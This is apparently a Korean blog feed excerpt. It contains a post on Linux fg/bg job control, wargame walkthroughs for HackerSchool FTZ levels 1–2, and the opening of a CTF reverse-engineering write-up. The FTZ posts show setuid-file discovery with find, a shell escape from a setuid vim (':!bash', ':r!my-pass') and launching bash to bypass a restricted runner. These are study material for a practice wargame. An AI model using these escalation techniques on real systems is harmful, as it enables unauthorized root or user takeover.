&lt;p&gt;이런 식으로 fg를 사용하게 되면 멈추어 있던 프로세스를 다시 되돌리게 됩니다.&lt;/p&gt;
&lt;p&gt;그럼 이번에는 &lt;code class=&quot;language-text&quot;&gt;bg&lt;/code&gt;명령을 사용해 보겠습니다.&lt;/p&gt;
&lt;p&gt;bg(&lt;strong&gt;B&lt;/strong&gt;ack&lt;strong&gt;G&lt;/strong&gt;round)를 사용하게 되면 프로세스를 다시 실행시키지만, 제어할 수 있는 상태로 변경은 되지 않습니다. 단순히 뒤에서 실행되고 있기 때문에, 실행 결과(출력결과, 파일 생성 등…)은 정상적으로 이루어 지게 되지만 제어를 할 수 있는 상태는 아니게 됩니다.&lt;/p&gt;
&lt;p&gt;background프로세스의 대표적인 예로는 &lt;strong&gt;데몬프로그램&lt;/strong&gt;(ex. httpd, sshd, telnetd등 이름이 d(deamon)로 끝나고, 서비스를 제공해주는 프로그램)등이 있습니다.&lt;/p&gt;
&lt;p&gt;그럼 &lt;code class=&quot;language-text&quot;&gt;bg&lt;/code&gt;를 사용해 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# bg&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;+ ./process.sh &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# 7&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; process.sh
&lt;span class=&quot;token comment&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token for-or-select variable&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$i&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;done&lt;/span&gt;
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# 10&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;
fg17
&lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt;
./process.sh
&lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;
^Z
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;+  Stopped                 ./process.sh
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기서 보아야 할 점은 2번줄과 12번줄 입니다. &lt;strong&gt;root@ubuntu:~#&lt;/strong&gt; 으로 명령을 기다리는 상태가 되었습니다.&lt;/p&gt;
&lt;p&gt;현재 프로그램이 실행되고 있는데, 그와 별개로 추가적인 쉘 명령을 기다리고 있다는 것은 이 상태에서 추가 명령을 할 수 있다는 것 입니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; process.sh
&lt;span class=&quot;token comment&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token for-or-select variable&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$i&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;done&lt;/span&gt;
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# 10&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;5번줄에서 cat process.sh를 하여 명령을 실행시켜 보았습니다. 프로세스가 실행되고 있는 상태이지만, &lt;code class=&quot;language-text&quot;&gt;cat&lt;/code&gt;명령이 잘 작동하였습니다. cat이 실행되고, 4번줄에 9가 출력되었는데 그 다음 숫자인 10이 12번줄에 출력된 것으로 보아 정상적으로 실행 중인 것을 알수 있습니다. 이것을 보고 컨트롤 할수 있는 공간과 컨트롤 하지 못하는 공간이 존재한다고 추측할 수 있습니다. (그냥 개인적인 생각입니다. 자세히는 몰라요 ㅎㅎ.)&lt;/p&gt;
&lt;p&gt;이제 &lt;code class=&quot;language-text&quot;&gt;bg&lt;/code&gt;모드인 프로그램을 &lt;code class=&quot;language-text&quot;&gt;fg&lt;/code&gt;로 돌리는 방법은 fg명령을 실행하면 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# 10&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;
fg17
&lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt;
./process.sh
&lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;
^Z
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;+  Stopped                 ./process.sh
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;fg&lt;/code&gt;명령어를 실행시켜도 출력되는 부분은 변화가 없는데, &lt;code class=&quot;language-text&quot;&gt;bg&lt;/code&gt;에서도 정상적으로 출력이 되고 있던 상황이기 때문에 인지하지 못한 것 같습니다.&lt;/p&gt;
&lt;p&gt;하지만 bg모드에서는 &lt;code class=&quot;language-text&quot;&gt;Ctrl + Z&lt;/code&gt;등 명령을 수행할 수 없는 상태인데, fg를 실행시킨 후 Ctrl + Z를 하게되면 &lt;code class=&quot;language-text&quot;&gt;^Z&lt;/code&gt;과 같이 정상적으로 이루어 지는 것을 볼 수 있습니다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[FTZ Level2]]></title><description><![CDATA[level1에서 획득한 패스워드를 이용하여 level2에 접속합니다. 우선 다음 권한을 획득해야 하므로 명령을 이용하여 level…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 24 May 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;level1에서 획득한 패스워드를 이용하여 level2에 접속합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level2@ftz level2]$ ls -l
total 12
-rw-r--r--    1 root     root           60 Mar 23  2000 hint
drwxr-xr-x    2 root     level2       4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level2       4096 May 22 00:27 tmp

[level2@ftz level2]$ cat hint

텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;우선 다음 권한을 획득해야 하므로 &lt;code class=&quot;language-text&quot;&gt;find&lt;/code&gt;명령을 이용하여 level3의 프로그램을 찾도록 하겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level2@ftz level2]$ find / -user level3 -perm +6000 2&gt;/dev/null

/usr/bin/editor&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이런 파일 한개가 나오게 되었습니다. 힌트와 같이 편집기로 추정되는 파일이므로 아마 이 프로그램에서 사용되는 기능으로 추정됩니다.&lt;/p&gt;
&lt;p&gt;그럼 이 프로그램을 실행시켜 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;~
~
~                            VIM - Vi IMproved
~
~                             version 6.1.320
~                         by Bram Moolenaar et al.
~               Vim is open source and freely distributable
~
~                      Help poor children in Uganda!
~              type  :help iccf&amp;lt;Enter&gt;       for information
~
~              type  :q&amp;lt;Enter&gt;               to exit
~              type  :help&amp;lt;Enter&gt;  or  &amp;lt;F1&gt;  for on-line help
~              type  :help version6&amp;lt;Enter&gt;   for version info
~
~
~&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이러한 프로그램이 시작되었습니다. vi 편집기가 실행되었는데, vi편집기의 기능을 이용하는 것임을 알 수 있습니다. vi에서 명령을 실행시킬수 있는데, :을 입력해 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;~
~
~                            VIM - Vi IMproved
~
~                             version 6.1.320
~                         by Bram Moolenaar et al.
~               Vim is open source and freely distributable
~
~                      Help poor children in Uganda!
~              type  :help iccf&amp;lt;Enter&gt;       for information
~
~              type  :q&amp;lt;Enter&gt;               to exit
~              type  :help&amp;lt;Enter&gt;  or  &amp;lt;F1&gt;  for on-line help
~              type  :help version6&amp;lt;Enter&gt;   for version info
~
~
~
:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 옵션을 사용할 수 있는 상태가 되게 되는데, 이때 &lt;strong&gt;w&lt;/strong&gt;를 입력하고 엔터를 누르게 될 경우 저장, &lt;strong&gt;q&lt;/strong&gt;를 누르고 엔터를 누르면 끝내기와 같은 기능이 있습니다. 이 외에도 많은 기능이 있습니다.&lt;/p&gt;
&lt;p&gt;그 기능중에 명령을 실행 시킬 수 있는 옵션이 있는데, 그 옵션은 &lt;code class=&quot;language-text&quot;&gt;!&lt;/code&gt;를 이용하는 옵션입니다. !를 입력하고 기능을 실행하면 그 기능을 쉘에서 실행시키는 것과 같이 실행할 수 있습니다. 그 방법 외에도 실행시킨 결과를 편집기로 저장하는 방법이 있는데 &lt;code class=&quot;language-text&quot;&gt;r!&lt;/code&gt;를 사용하는 방법이 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;total 12
-rw-r--r--    1 root     root           60 Mar 23  2000 hint
drwxr-xr-x    2 root     level2       4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level2       4096 May 22 00:27 tmp
~
~
~
~
~
~
~
~
~
~
~
~
~
:r!ls -l&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;와 같이 사용하게 될 경우 ls -l옵션을 출력하는데 그 출력 결과를 편집기로 보내어 저장을 할 수 있는 상태로 만듭니다. 이러한 식으로 my-pass명령을 사용하게 되면 비밀번호 출력 결과를 편집기에 출력하게 되므로 다음단계 비밀번호를 알아낼 수 있습니다.&lt;/p&gt;
&lt;p&gt;my-pass명령 뿐만 아니라 &lt;code class=&quot;language-text&quot;&gt;bash&lt;/code&gt;와 같이 쉘을 실행시키는 옵션도 가능합니다. bash를 실행 시켜 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level3@ftz level2]$ id
uid=3003(level3) gid=3002(level2) groups=3002(level2)
[level3@ftz level2]$&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이러한 식으로 권한을 획득할 수도 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;^[[H^[[2J
Level3 Password is &quot;            &quot;.

~
~
~
~
~
~
~
~
~
~
~
~
~
~
:r!my-pass&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[FTZ Level1]]></title><description><![CDATA[FTZ에 접속하실 분들은  으로 접속하여 하시면 되겠습니다. level1 / level1 으로 접속하여 진행하도록 하겠습니다. 접속을 하여 파일을 확인해 보면 hint라는 파일이 있습니다. 뿐만 아니라 , 라는게 존재합니다.…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 19 May 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;FTZ에 접속하실 분들은 &lt;code class=&quot;language-text&quot;&gt;telnet ftz.hackerschool.org&lt;/code&gt; 으로 접속하여 하시면 되겠습니다. level1 / level1 으로 접속하여 진행하도록 하겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz level1]$ ls
hint  public_html  tmp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;접속을 하여 파일을 확인해 보면 hint라는 파일이 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz level1]$ cat hint
level2 권한에 setuid가 걸린 파일을 찾는다.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;setuid&lt;/code&gt;뿐만 아니라 &lt;code class=&quot;language-text&quot;&gt;setgid&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;sticky bit&lt;/code&gt;라는게 존재합니다. 3가지 모두 알아봅시다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;setuid&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;해당 프로그램을 실행시킬 경우 프로그램이 작동하는 동안 소유자의 권한을 가지는 권한 입니다.&lt;/li&gt;
&lt;li&gt;만약 user1의 파일에 setuid가 걸려있는 상태로 user2가 실행을 하게될 경우, user2가 일시적으로 user1이 될 수 있습니다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;setgid&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;setuid와 비슷하지만 소유자가 아닌 소유그룹이 대상입니다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;sticky bit&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sticky bit가 설정되었을 경우 수정이나 실행, 읽기의 경우는 허용이 되지만, 삭제의 경우에는 소유자만 할 수 있습니다. 하지만 root의 경우는 예외적으로 삭제를 할 수 있습니다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;해당 권한이 걸려있는 경우를 확인하기 쉬운 방법은 &lt;code class=&quot;language-text&quot;&gt;ls -l&lt;/code&gt;을 이용하여 확인할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz tmp]$ ls -l test
-rwsrwsrwt    1 level1   level1      11435 Mar  2 00:49 test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;앞에서부터 s는 setuid가 걸려있는 경우, 가운데 s는 setgid가 걸려있는 경우, 마지막 t는 sticky bit가 걸려있는 경우입니다. test파일은 현재 rwx의 권한을 모두 가지고 있는 상태입니다. 여기서 보아야 할 점은 특수한 권한인 setuid, setgid, sticky bit가 설정된 경우에는 x의 부분에 표시가 된다는 점입니다. 그럼 만약 x가 걸려있는 상태가 아니라면 어떻게 나올까요?&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz tmp]$ ls -l test
-rwSrwSrwT    1 level1   level1      11435 Mar  2 00:49 test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;아까와 마찬가지로 x의 부분에 나타나기는 하지만 차이점으로는 x의 권한이 존재한다면 소문자로 출력이 되었지만, 만약 권한이 없는 상태라면 대문자로 차이점을 표현하였습니다.&lt;/p&gt;
&lt;p&gt;그럼 이 권한을 어떻게 부여 할까요? 방법은 &lt;code class=&quot;language-text&quot;&gt;chmod&lt;/code&gt;를 이용하여 권한을 부여하게 됩니다. chmod를 사용하면 단순히 rwx뿐만 아니라 setuid, setgid, sticky bit의 권한도 부여가 가능합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz tmp]$ ls -l test
----------    1 level1   level1          5 May 17 07:55 test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;현재 권한이 설정되어 있지 않은 상태입니다. 이 상태에서 chmod명령어를 이용하여 권한을 설정해 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz tmp]$ chmod 1000 test
[level1@ftz tmp]$ ls -l test
---------T    1 level1   level1          5 May 17 07:55 test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;1000&lt;/strong&gt;을 주었더니 sticky bit가 걸리게 되었습니다. 그럼 다른 권한도 입력해 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz tmp]$ chmod 2000 test
[level1@ftz tmp]$ ls -l test
------S---    1 level1   level1          5 May 17 07:55 test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;2000&lt;/strong&gt;을 주게되니 setgid가 걸렸습니다. 마지막인 setuid도 해보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz tmp]$ chmod 4000 test
[level1@ftz tmp]$ ls -l test
---S------    1 level1   level1          5 May 17 07:55 test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;4000&lt;/strong&gt;을 이용하여 권한을 부여하였습니다. 이뿐만 아니라 한번에 여러개를 부여할수도 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz tmp]$ chmod 5000 test
[level1@ftz tmp]$ ls -l test
---S-----T    1 level1   level1          5 May 17 07:55 test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;5(4 + 1)000을 사용하니 sticky bit와 setuid가 함께 걸리게 되었습니다. 이런식으로 여러 조합을 이용하여 원하는 권한을 설정할 수 있습니다.&lt;/p&gt;
&lt;p&gt;이제 본론으로 들어가서 문제를 해결해 보겠습니다. &lt;/p&gt;
&lt;p&gt;find는 &lt;code class=&quot;language-text&quot;&gt;find [path...] [expression]&lt;/code&gt; 이런식으로 사용할 수 있습니다. &lt;/p&gt;
&lt;p&gt;찾고자 하는 파일이 어디에 있는지 모르기 때문에, /폴더부터 검색을 시작하도록 하겠습니다.
먼저 find명령의 &lt;strong&gt;-perm옵션&lt;/strong&gt;을 통하여 setuid가 걸려있는 파일을 검색하도록 하겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz level1]$ find / -perm -4000
find: /lost+found: Permission denied
... 생략 ...
/sbin/unix_chkpwd
[level1@ftz level1]$&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;-perm옵션에 &lt;strong&gt;-4000&lt;/strong&gt;으로 주었는데, 이는 &lt;code class=&quot;language-text&quot;&gt;4(setuid)&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;2(setgid)&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;1(sticky bit)&lt;/code&gt;중 setuid를 검색하는 옵션입니다.&lt;/p&gt;
&lt;p&gt;여기서 +6000으로 주는 방법도 있는데, -와 +의 차이점은 and와 or의 차이점이라 보시면 될 것 같습니다.&lt;/p&gt;
&lt;p&gt;-6000을 하게 되면 4 and 2라 생각하시면 될 것 같고, +6000을 하게 되면 4 or 2라 생각하시면 됩니다. 4와 2의 권한중 한개만 걸려있어도 권한을 상승시켜 사용할 수 있기 때문에 이중 한개만 걸려있어도 검색하는 +6000을 사용하는 경우가 많습니다.&lt;/p&gt;
&lt;p&gt;이렇게 결과가 나오긴 했는데 매우 많이 나오게 됩니다. 이 내용중 permission denied가 나오는데 이는 접근할 수 없는 공간을 검색을 위하여 접근하려 하니 권한이 없다고 출력을 해주는 부분 입니다. 이렇게 에러가 많이 나오는데 이 에러를 제거하기 위해서 옵션을 넣어 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz level1]$ find / -perm -4000 2&gt;/dev/null
/usr/bin/chage
... 생략 ...
/sbin/unix_chkpwd
[level1@ftz level1]$&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;2&gt;/dev/null&lt;/code&gt;이라는 옵션은 2(표준에러)를 &gt;(리다이렉션) 해주는데, /dev/null(휴지통과 같은 공간)으로 보내겠다. 라는 의미로 생각하시면 될 것 같습니다. 권한이 없다는 출력은 표준에러를 통해서 출력해 주는데, “표준에러를 휴지통으로 보내버리겠다.”는 옵션을 주어 많은 결과물을 줄이게 되었습니다. 하지만 아직도 많은 파일이 뜨게 되는데, 이중 우리에게 필요한 것은 level2의 파일이므로, 옵션을 한개 더 주도록 하겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level1@ftz level1]$ find / -user level2 -perm -4000 2&gt;/dev/null
/bin/ExecuteMe
[level1@ftz level1]$ &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;옵션으로 -user옵션이 추가되었는데, 해당 &lt;strong&gt;소유자의 파일&lt;/strong&gt;을 검색해 주는 옵션입니다. 이 옵션을 통해 level2의 소유 파일을 검색하여 정확이 원하는 파일을 검색할 수 있게 되었습니다. 이 파일을 실행시켜 보도록 하겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;레벨2의 권한으로 당신이 원하는 명령어를
한가지 실행시켜 드리겠습니다.
(단, my-pass 와 chmod는 제외)

어떤 명령을 실행시키겠습니까?


[level2@ftz level2]$&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음 레벨의 패스워드를 알 수 있는 my-pass를 실행시킬 수 없고, chmod를 사용하지도 못합니다. 하지만 쉘을 실행시킬수 있으므로 쉘을 실행시켜 해당 파일의 명령을 우회할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level2@ftz level2]$ bash

[level2@ftz level2]$ id
uid=3002(level2) gid=3001(level1) groups=3001(level1)
[level2@ftz level2]$ my-pass

Level2 Password is &quot;               &quot;

[level2@ftz level2]$&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Confidence CTF Teaser 2015 - So easy[100] (reverse)]]></title><description><![CDATA[문제 파일 및 정확한 write-up을 참고해주세요. 우선 이 문제를 받고 어떠한 파일인지 확인을 해보았습니다. 문제 파일을 보게되면  리눅스 Intel계열 에서 실행이 가능합니다. 이제 실행을 해보도록 하겠습니다. 123…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 13 May 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;문제 파일 및 정확한 write-up을 &lt;a href=&quot;https://github.com/ctfs/write-ups-2015/tree/master/confidence-ctf-teaser-2015/reverse/so-easy-100&quot;&gt;참고&lt;/a&gt;해주세요.&lt;/p&gt;
&lt;p&gt;우선 이 문제를 받고 어떠한 파일인지 확인을 해보았습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ls -l re_100_final&lt;/span&gt;
-rwxr-xr-x &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;token number&quot;&gt;9756&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2015&lt;/span&gt;-04-24 &lt;span class=&quot;token number&quot;&gt;21&lt;/span&gt;:10 re_100_final
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# file re_100_final&lt;/span&gt;
re_100_final: ELF &lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;-bit LSB executable, Intel &lt;span class=&quot;token number&quot;&gt;80386&lt;/span&gt;, version &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;, dynamically linked &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uses shared libs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; GNU/Linux &lt;span class=&quot;token number&quot;&gt;2.6&lt;/span&gt;.24, stripped&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;문제 파일을 보게되면 &lt;code class=&quot;language-text&quot;&gt;32bit&lt;/code&gt; 리눅스 Intel계열 에서 실행이 가능합니다.&lt;/p&gt;
&lt;p&gt;이제 실행을 해보도록 하겠습니다.&lt;/p&gt;
